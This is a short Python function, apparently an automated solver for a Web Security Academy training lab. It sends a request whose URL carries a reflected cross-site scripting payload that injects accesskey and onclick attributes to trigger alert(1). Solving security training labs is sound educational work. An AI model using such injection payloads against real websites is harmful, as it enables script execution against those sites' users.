from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "/?'accesskey='x'onclick='alert(1)"

    session.get_path(xss)
    logger.info(f'Visited path "{xss}"')
